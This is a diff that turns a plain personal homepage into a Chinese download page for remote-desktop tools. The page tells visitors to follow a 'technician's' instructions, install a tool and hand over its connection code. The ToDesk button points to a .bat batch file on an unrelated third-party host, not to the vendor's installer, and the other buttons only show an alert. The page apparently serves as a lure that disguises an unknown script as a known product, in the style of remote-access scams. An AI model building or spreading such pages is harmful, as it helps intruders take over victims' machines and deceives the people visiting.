@@ -3,27 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>xzgg.top 首页</title>
-    <style>
-        /* 简单美化，让页面不单调 */
-        body {
-            background-color: #f5f5f5;
-            text-align: center;
-            margin-top: 150px;
-            font-family: "微软雅黑", sans-serif;
+    <title>远程控制工具下载</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#3b82f6',
+                        secondary: '#6366f1',
+                        accent: '#8b5cf6',
+                        dark: '#1e293b',
+                        light: '#f8fafc'
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif']
+                    },
+                    boxShadow: {
+                        'card': '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)',
+                        'card-hover': '0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)'
+                    }
+                }
+            }
         }
-        h1 {
-            color: #2c3e50;
-            font-size: 36px;
-        }
-        p {
-            color: #7f8c8d;
-            font-size: 18px;
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .download-card {
+                @apply bg-white rounded-lg shadow-card p-6 transition-all duration-300 hover:shadow-card-hover hover:-translate-y-1 flex flex-col h-full;
+            }
+            .card-content {
+                @apply flex flex-col items-center justify-between h-full;
+            }
+            .card-top {
+                @apply text-center mb-4;
+            }
+            .download-icon {
+                @apply text-4xl mb-4;
+            }
+            .download-title {
+                @apply text-xl font-semibold mb-2 text-dark;
+            }
+            .download-description {
+                @apply text-gray-600 mb-4;
+            }
+            .download-button {
+                @apply bg-primary text-white py-2 px-4 rounded-md hover:bg-blue-600 transition-colors duration-300 flex items-center justify-center gap-2;
+            }
         }
     </style>
 </head>
-<body>
-    <h1>欢迎访问 xzgg.top</h1>
-    <p>这是通过 GitHub Pages 搭建的网页，无需付费服务器！</p>
+<body class="bg-gray-100 min-h-screen py-12 px-4 sm:px-6 lg:px-8">
+    <div class="max-w-4xl mx-auto">
+        <!-- 标题区域 -->
+        <div class="text-center mb-12">
+            <h1 class="text-3xl font-bold text-dark mb-2">请按照工程师或技术的要求，点击下面图标进行下载</h1>
+            <p class="text-gray-600">选择适合您需求的远程控制工具</p>
+        </div>
+
+        <!-- 下载卡片区域 -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <!-- ToDesk 下载卡片 -->
+            <div class="download-card">
+                <div class="card-content">
+                    <div class="card-top">
+                        <div class="download-icon text-primary">
+                            <i class="fa fa-desktop"></i>
+                        </div>
+                        <h2 class="download-title">ToDesk</h2>
+                        <p class="download-description">高效稳定的远程桌面控制工具</p>
+                    </div>
+                    <a href="https://silver.yukaidi.com/f/LAWJHO/ToDesk_20250825.bat" class="download-button w-full" download>
+                        <i class="fa fa-download"></i>
+                        <span>立即下载</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- 向日葵远程下载卡片 -->
+            <div class="download-card">
+                <div class="card-content">
+                    <div class="card-top">
+                        <div class="download-icon text-secondary">
+                            <i class="fa fa-sun-o"></i>
+                        </div>
+                        <h2 class="download-title">向日葵远程</h2>
+                        <p class="download-description">简单易用的远程控制解决方案</p>
+                    </div>
+                    <a href="#" class="download-button w-full" onclick="showAlert('向日葵远程')">
+                        <i class="fa fa-download"></i>
+                        <span>立即下载</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- 连连控下载卡片 -->
+            <div class="download-card">
+                <div class="card-content">
+                    <div class="card-top">
+                        <div class="download-icon text-accent">
+                            <i class="fa fa-globe"></i>
+                        </div>
+                        <h2 class="download-title">连连控</h2>
+                        <p class="download-description">适用于港澳台或境外地区的远程控制工具</p>
+                    </div>
+                    <a href="#" class="download-button w-full" onclick="showAlert('连连控')">
+                        <i class="fa fa-download"></i>
+                        <span>立即下载</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- 说明区域 -->
+        <div class="mt-12 bg-white rounded-lg shadow-card p-6">
+            <h3 class="text-xl font-semibold text-dark mb-4">使用说明</h3>
+            <ul class="list-disc pl-5 space-y-2 text-gray-700">
+                <li>请根据技术人员的指导选择合适的远程控制工具</li>
+                <li>下载完成后，运行安装程序并按照提示进行安装</li>
+                <li>安装完成后，打开软件并获取远程连接码</li>
+                <li>将连接码提供给技术人员以建立远程连接</li>
+                <li>如需帮助，请联系您的技术支持人员</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // 显示下载提示的JavaScript函数
+        function showAlert(toolName) {
+            alert(`即将开始下载 ${toolName}。请稍候...`);
+            // 这里可以添加实际的下载逻辑
+        }
+
+        // 为所有下载链接添加点击事件跟踪
+        document.addEventListener('DOMContentLoaded', function() {
+            const downloadLinks = document.querySelectorAll('.download-button');
+            
+            downloadLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    const toolName = this.closest('.download-card').querySelector('.download-title').textContent;
+                    console.log(`用户点击了 ${toolName} 的下载按钮`);
+                    
+                    // 可以在这里添加更多的分析或跟踪代码
+                });
+            });
+        });
+    </script>
 </body>
 </html>
